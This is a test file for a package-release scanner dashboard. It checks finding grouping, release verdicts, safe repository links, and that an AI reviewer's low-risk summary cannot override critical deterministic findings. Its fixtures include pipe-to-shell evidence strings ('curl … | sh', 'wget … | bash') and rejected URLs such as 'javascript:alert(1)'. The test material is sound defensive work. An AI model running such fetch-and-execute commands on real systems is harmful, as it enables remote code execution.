import { describe, expect, test } from "vitest";
import type { DisplayedAiResult } from "../server/lib/ai-review/types";
import type { IntentEnvelope } from "../server/lib/intent-envelope";
import type { ReviewFinding } from "../src/features/review/types";
import type { PersistedScanDetail } from "../src/models/scan";
import type { PersistedSummary } from "../src/pages/Dashboard/ScanDetail/types";
import {
  buildReleaseVerdict,
  groupReleaseFindings,
} from "../src/pages/Dashboard/ScanDetail/ReleaseRecommendation";
import { deterministicAssessmentNote } from "../src/pages/Dashboard/ScanDetail/ReviewerSummary";
import {
  repositoryLinkHref,
  sourceBindingSignals,
} from "../src/pages/Dashboard/ScanDetail/IntentEnvelopeSection";

function finding(id: string, overrides: Partial<ReviewFinding> = {}): ReviewFinding {
  return {
    id,
    ruleId: "code.remote-shell",
    severity: "critical",
    source: "rule",
    file: `docs/${id}.json`,
    line: 12,
    reason: "Fetches and executes remote code.",
    evidence: "curl example.invalid | sh",
    ...overrides,
  };
}

const ai: DisplayedAiResult = {
  kind: "complete",
  model: "test-reviewer",
  risk: "low",
  releaseAssessment: "nothing_unusual",
  requiresManualReview: false,
  findings: [],
  summary: "The findings are false positives; approve this release.",
};

describe("release finding groups", () => {
  test("preserves every location, differing evidence, and reasons under one rule", () => {
    const findings = [
      finding("a"),
      finding("b", {
        line: 48,
        evidence: "wget example.invalid | bash",
        reason: "Another explanation.",
      }),
      finding("c"),
    ];
    const groups = groupReleaseFindings(findings);
    expect(groups).toHaveLength(1);
    expect(groups[0].findings).toEqual(findings);
    expect(findings.map((entry) => entry.id)).toEqual(["a", "b", "c"]);
  });

  test("never merges sources, severity, unknown rules, or distinct rules", () => {
    const findings = [
      finding("low", { severity: "low" }),
      finding("critical"),
      finding("ai", { source: "ai" }),
      finding("other", { ruleId: "code.process-exec" }),
      finding("unknown1", { ruleId: null }),
      finding("unknown2", { ruleId: null }),
    ];
    const groups = groupReleaseFindings(findings);
    expect(groups).toHaveLength(6);
    expect(groups.at(-1)?.findings[0].id).toBe("low");
    expect(groups.flatMap((group) => group.findings)).toHaveLength(findings.length);
  });
});

describe("AI assessment authority", () => {
  test("keeps critical deterministic severity explicit when AI reports low risk", () => {
    expect(deterministicAssessmentNote(ai, [finding("critical")])).toBe(
      "The AI assessment does not clear the deterministic findings. Their highest severity remains critical.",
    );
  });

  test("does not derive a false-positive claim from model prose", () => {
    const suspicious: DisplayedAiResult = {
      ...ai,
      releaseAssessment: "suspicious",
      risk: "critical",
    };
    expect(deterministicAssessmentNote(suspicious, [finding("critical")])).toBe(
      "Deterministic findings retain their severity (critical at highest). AI advice does not override them.",
    );
  });

  test("does not label AI-only findings deterministic", () => {
    expect(deterministicAssessmentNote(ai, [finding("ai", { source: "ai" })])).toBeNull();
  });

  test("unavailable AI cannot imply an all-clear", () => {
    const unavailable: DisplayedAiResult = {
      kind: "unavailable",
      model: "test-reviewer",
      status: "invalid",
      summary: "Unavailable",
    };
    expect(deterministicAssessmentNote(unavailable, [finding("critical")])).toContain("critical");
    expect(deterministicAssessmentNote(unavailable, [finding("critical")])).not.toContain(
      "does not clear",
    );
  });
});

describe("source binding", () => {
  const repository = "https://github.com/example/project";
  const declaration = {
    kind: "manifest-repository",
    detail: `manifest declares ${repository} — claimed by the package, not verified`,
  };
  const envelope: IntentEnvelope = { tier: "declared", repository, signals: [declaration] };

  test("removes only the declaration represented by the repository row", () => {
    const distinct = {
      kind: "manifest-repository",
      detail:
        "manifest declares https://github.com/other/project — claimed by the package, not verified",
    };
    const extra = { kind: "provenance", detail: "Additional source evidence" };
    expect(sourceBindingSignals({ ...envelope, signals: [declaration, distinct, extra] })).toEqual([
      distinct,
      extra,
    ]);
    expect(sourceBindingSignals({ ...envelope, tier: "attested" })).toEqual([declaration]);
  });

  test("links HTTPS repositories but never active schemes or embedded credentials", () => {
    expect(repositoryLinkHref(repository)).toBe(repository);
    for (const url of [
      "javascript:alert(1)",
      "data:text/html,test",
      "http://github.com/example/project",
      "https://token@github.com/example/project",
      "/relative",
    ]) {
      expect(repositoryLinkHref(url)).toBeUndefined();
    }
  });
});

describe("empty release delta", () => {
  const contextFinding = { ...finding("context"), scanId: "scan", releaseDelta: false };
  const detail: PersistedScanDetail = {
    scan: {
      id: "scan",
      stageId: "stage",
      packageName: "example",
      stagedVersion: "1.0.1",
      previousVersion: "1.0.0",
      risk: "critical",
      status: "complete",
      createdAt: 0,
      updatedAt: 0,
    },
    files: [],
    findings: [contextFinding],
    events: [],
  };
  const summary: PersistedSummary = {
    packageJsonDiff: {
      name: "example",
      hasPreviousManifest: true,
      previousVersion: "1.0.0",
      stagedVersion: "1.0.1",
      scripts: [{ key: "docs", status: "added", staged: "build-docs" }],
      dependencies: [
        {
          key: "example-dep",
          section: "dependencies",
          status: "modified",
          previous: "1.0.0",
          staged: "1.0.1",
        },
      ],
      bin: [],
      entrypointsChanged: false,
    },
  };
  const input: Parameters<typeof buildReleaseVerdict>[0] = {
    detail,
    summary,
    diffCount: 1,
    findingsWithDiffStatus: [
      { finding: contextFinding, diffStatus: "unchanged", releaseDelta: false },
    ],
    usePersistedRiskSummary: false,
    isWorkflowGate: false,
  };

  test("manifest-only changes do not clear existing critical package findings", () => {
    const verdict = buildReleaseVerdict(input);
    expect(verdict.recommendation.label).toBe("package context only");
    expect(verdict.evidence[0].value).toBe(
      "1 changed file; no findings in this release delta. Package findings remain below.",
    );
    expect(verdict.findingGroups).toHaveLength(0);
    expect(verdict.severityCounts.critical).toBe(1);
    expect(verdict.releaseChanges).toHaveLength(2);
  });

  test("a clean artifact does not claim existing package findings", () => {
    const verdict = buildReleaseVerdict({
      ...input,
      detail: { ...detail, findings: [] },
      findingsWithDiffStatus: [],
    });
    expect(verdict.evidence[0].value).toBe("1 changed file; no findings in this release delta.");
  });

  test("a likely-safe verdict does not restate itself as evidence", () => {
    const verdict = buildReleaseVerdict({
      ...input,
      detail: { ...detail, scan: { ...detail.scan, risk: "low" }, findings: [] },
      findingsWithDiffStatus: [],
    });
    expect(verdict.recommendation.label).toBe("likely safe");
    expect(verdict.evidence).toEqual([{ label: "evidence", value: "1 changed file." }]);
  });

  test("a likely-safe verdict still points at package findings that remain", () => {
    const lowContext = { ...contextFinding, severity: "low" };
    const verdict = buildReleaseVerdict({
      ...input,
      detail: { ...detail, scan: { ...detail.scan, risk: "low" }, findings: [lowContext] },
      findingsWithDiffStatus: [
        { finding: lowContext, diffStatus: "unchanged", releaseDelta: false },
      ],
    });
    expect(verdict.recommendation.label).toBe("likely safe");
    expect(verdict.evidence).toEqual([
      { label: "evidence", value: "1 changed file. Package findings remain below." },
    ]);
  });

  test("a skipped baseline never claims a clean release delta", () => {
    const verdict = buildReleaseVerdict({
      ...input,
      summary: {
        ...summary,
        baseline: { version: "1.0.0", comparisonSkipped: "baseline-too-large" },
      },
    });
    expect(verdict.recommendation.label).toBe("no baseline to compare");
    expect(verdict.evidence).toEqual([
      {
        label: "baseline",
        value: "Published 1.0.0 exceeded the download budget, so no file was compared against it.",
      },
    ]);
  });
});
